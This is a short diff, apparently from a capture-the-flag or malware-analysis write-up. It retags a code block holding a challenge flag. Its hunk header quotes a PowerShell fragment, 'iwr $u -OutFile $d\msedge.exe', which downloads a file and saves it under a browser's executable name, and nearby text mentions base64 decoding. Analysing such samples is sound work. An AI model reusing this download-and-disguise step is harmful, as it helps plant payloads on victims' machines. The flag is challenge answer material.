@@ -55,6 +55,6 @@ iwr $u -OutFile $d\msedge.exe;
 
 Another base64!
 
-```
+```flag
 FLAG{Dayum_this_is_secret_file}
 ```
